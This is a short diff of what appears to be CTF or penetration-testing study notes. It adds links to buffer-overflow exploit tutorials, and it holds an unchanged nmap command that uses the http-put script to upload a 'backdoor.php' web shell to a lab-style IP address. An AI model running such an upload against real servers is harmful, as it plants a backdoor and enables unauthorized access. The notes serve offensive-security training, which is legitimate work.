@@ -73,7 +73,10 @@ Spoilers
 
    priv esc > binary bof exploit development > bof in corlan team
 
+    https://sploitfun.wordpress.com/
+    https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
 
+    
 Shell file upload
   nmap -p 80 --script http-put --script-args http-put.url='/admin.php/backdoor.php',http-put.file='backdoor.php' 10.10.10.27 -v
 
